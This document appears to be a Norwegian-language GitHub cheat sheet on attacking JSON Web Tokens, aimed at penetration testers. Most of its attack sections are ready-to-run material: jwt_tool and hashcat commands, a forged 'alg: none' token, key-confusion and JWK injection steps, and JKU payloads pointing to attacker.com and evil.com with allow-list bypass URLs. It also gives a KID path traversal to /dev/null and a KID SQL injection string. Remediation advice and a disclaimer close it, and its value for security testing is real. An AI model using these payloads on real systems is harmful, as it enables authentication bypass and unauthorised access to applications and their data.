<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🎟️ JWT-angrep - komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Nøkkelangrep">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API-testing">
</p>

<p align="center">
  <b>🛡️ Omfattende metodikk og praktiske kommandoer for å utnytte JSON Web Token-sårbarheter (JWT)</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Introduction & Anatomy of a JWT](#-introduction--anatomy-of-a-jwt)
– [Essential Testing Tools](#-essential-testing-tools)
- [Sårbarhetsmatrise og angrepsvektorer](#-sårbarhetsmatrise--angrepsvektorer)
  - [1. Ingen algoritmefeil (`alg: "none"`)](#1-ingen-algoritmefeil-alg-ingen)
  - [2. Svak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. Algoritmeforvirring / nøkkelforvirring (RS256 -> HS256)](#3-algoritmeforvirring--nøkkelforvirring-rs256---hs256)
  - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
  - [5. JKU (JWK Set URL) Feilkonfigurasjon og SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. KID (Key ID) Header Manipulation & Injections](#6-kid-key-id-header-manipulation--injections)
  - [7. Cross-Service Relaying & Sensitive Data Leakage](#7-cross-service-relaying--sensitive-data-lekkage)
- [Automatisering av tester med `jwt_tool`](#-automatiseringstester-med-jwt_tool)
- [Knekker JWT-hemmeligheter med Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Remediation & Secure Implementation](#-remediation--secure-implementation)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon og anatomi til en JWT

Et **JSON Web Token (JWT)** er en kompakt, URL-sikker måte å representere krav mellom to parter på. Vanligvis brukt for øktautentisering i moderne REST APIer, Single Page Applications (SPAer) og mikrotjenester.

En standard JWT består av tre Base64URL-kodede deler atskilt med prikker (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Overskrift:** Identifiserer tokentypen og den kryptografiske algoritmen som brukes (f.eks. `HS256`, `RS256`, `none`).
2. **Nyttelast:** Inneholder kravene (f.eks. `user_id`, `role`, utløp `exp`). *Merk: Nyttelaster er kodet, IKKE kryptert!*
3. **Signatur:** Laget ved å hashe den kodede overskriften og nyttelasten ved hjelp av en hemmelig nøkkel eller privat nøkkel.

---

## 🛠️ Essensielle testverktøy

1. **jwt_tool:** Kommandolinjeverktøy for å analysere, teste og knekke JWT-er.
2. **Hashcat:** Rask GPU-basert HMAC-hemmelig cracking (Mode `16500`).
3. **Burp Suite Extension:** "JWT Editor" av Fraser Winterborn (i PortSwigger BApp Store).

### Installerer `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Sårbarhetsmatrise og angrepsvektorer

### 1. Ingen algoritmefeil (`alg: "none"`)

**Mekanisme:**
Noen JWT-verifiseringsbiblioteker anser tokens som gyldige hvis `alg`-overskriften er satt til `none`, og omgår fullstendig signaturverifisering.

**Utnyttelse:**
1. Dekode overskriften og endre `"alg": "HS256"` til `"alg": "none"`.
2. Endre nyttelastkrav (f.eks. `"role": "admin"`).
3. Fjern signaturdelen (behold den etterfølgende prikken!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Manuell tokenstruktur:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Svak HMAC Secret Cracking (HS256)

**Mekanisme:**
Hvis serveren signerer tokens ved hjelp av symmetriske algoritmer (`HS256`, `HS384`, `HS512`) med en gjettbar eller svak hemmelig nøkkel (f.eks. `secret`, `admin123`, firmanavn), kan en angriper brute-force hemmeligheten offline og signere vilkårlige tokens.

**Cracking med Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Smibrikke etter sprekking:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Algoritmeforvirring / nøkkelforvirring (RS256 -> HS256)

**Mekanisme:**
- **RS256 (asymmetrisk):** Signert med serverens private nøkkel; verifisert med serverens **offentlige nøkkel**.
- **HS256 (symmetrisk):** Signert og bekreftet med **samme delte hemmelighet**.

Hvis backend-biblioteket ikke strengt håndhever algoritmetyper, kan en angriper:
1. Skaff serverens offentlige nøkkel (ofte offentlig eksponert på `/.well-known/jwks.json` eller sertifikater).
2. Endre tokens algoritmehode fra `RS256` til `HS256`.
3. Signer det modifiserte tokenet med serverens **offentlige nøkkel** som HMAC-hemmeligheten!
4. Serveren mottar tokenet, ser `HS256` og verifiserer signaturen ved å bruke dens konfigurerte verifikasjonsnøkkel (som er dens offentlige nøkkel), noe som resulterer i en gyldig signatur!

**Utnyttelse via `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. JWK (JSON Web Key) Header Injection

**Mekanisme:**
JWT-spesifikasjonen tillater en innebygd offentlig nøkkel i `jwk`-headerparameteren. Sårbare servere stoler på denne overskriftsnøkkelen for å bekrefte signaturen uten å sjekke om nøkkelen tilhører en klarert CA eller forhåndsdelt hviteliste.

**Utnyttelse:**
1. Generer et angriper-RSA-nøkkelpar.
2. Bygg inn den offentlige nøkkelen i `jwk`-overskriften.
3. Signer tokenet med den tilhørende private nøkkelen.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. JKU (JWK Set URL) Feilkonfigurasjon og SSRF

**Mekanisme:**
Overskriften `jku` (JWK Set URL) spesifiserer en ekstern URL som serveren skal hente det offentlige nøkkelsettet fra for å bekrefte tokenet.

**Utnyttelse:**
1. Vert din egen `jwks.json` på en angriperwebserver:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Endre token-overskriften:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Signer tokenet med din private nøkkel.

> **Omgå nettadressehvitelister:**
> Hvis applikasjonen validerer domeneendelser, test åpne omdirigeringer eller nettadresseparsing:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - Åpen viderekobling: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. KID (Nøkkel-ID) Header Manipulation & Injeksjoner

`kid`-headeren er en streng som brukes til å identifisere hvilken nøkkel som skal lastes fra en database eller et filsystem.

#### A. Kataloggjennomgang til tom fil (`/dev/null`)
Hvis serveren leser nøkkelfilen fra disk ved hjelp av `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Signer tokenet med en tom hemmelighet (`""` / 0 bytes)!

#### B. SQL-injeksjon via KID
Hvis serveren henter hemmeligheten fra en database:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Injiser en kjent statisk streng:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Signer tokenet med den hemmelige `'my_known_secret'`.

---

### 7. Videresending på tvers av tjenester og sensitive datalekkasjer

- **Ukryptert PII:** Utviklere lagrer ofte passord, SSN-er eller sensitive brukermetadata i nyttelasten, og glemmer at den bare er Base64URL-kodet, ikke kryptert.
- **Tjenesteforvirring:** Bruk av et token beregnet på en tjeneste med lav privilegium (f.eks. analytics API) mot en intern administrativ API.

---

## ⚡ Automatisering av tester med `jwt_tool`

### Kjør alle innebygde Playbook-angrep
Den enkleste måten å skanne etter alle kjente sårbarheter automatisk:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Interaktiv manipuleringsmodus
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Å knekke JWT-hemmeligheter med Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Hurtigreferansetabell

| Sårbarhet | Angrepsteknikk | Nøkkel nyttelast / flagg |
|--------------|------------------------|------------------------|
| **Ingen Algoritme** | Sett `alg: "none"`, stripsignatur | `jwt_tool <TOKEN> -X a` |
| **Svak hemmelighet** | GPU-ordbok brute-force | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Algoritmeforvirring**| Endre RS256 til HS256, skilt med offentlig nøkkel | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **JWK Injection** | Bygg inn angriperens offentlige nøkkel i overskriften | `jwt_tool <TOKEN> -X i` |
| **JKU-injeksjon** | Pek `jku` til ekstern server | `"jku": "http://evil.com/jwks.json"` |
| **KID Traversal Path**| Pek `kid` til `/dev/null` eller kjent fil | `"kid": "/dev/null"` (Sign med `""`) |
| **KID SQLi** | Injiser statisk hemmelighet i SQL-spørring | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Utbedring og sikker implementering

1. **Eksplisitt hvitelistealgoritmer:**
   Tillat aldri klientstyrt `alg`-valg. Hardcode tillatte algoritmer på serveren (tillater for eksempel utelukkende `RS256`).
2. **Avvis `alg: none`-tokens:**
   Sørg for at biblioteket strengt avviser uverifiserte eller usignerte tokens.
3. **Bruk lange, kryptografisk sikre hemmeligheter:**
   HMAC-hemmeligheter må være minst 256 biter (32+ tilfeldige tegn) generert av en sikker CSPRNG.
4. **Valider `jku`- og `jwk`-overskrifter:**
   Hent kun JWK-sett fra en streng hviteliste over interne pålitelige URL-er; avvise brukerleverte eksterne domener.
5. **Desinfisering av `kid`-verdier:**
   Behandle `kid` som uklarert brukerinndata; rense mot kataloggjennomgang (`../`) og SQL-injeksjon.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** JWT-angrep kan føre til fullstendig omgåelse av autentisering og uautorisert tilgang til applikasjonsdatabaser. Denne veiledningen er strengt ment for utdanningsformål og autorisert penetrasjonstesting.

---

## 📚 Ressurser

- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)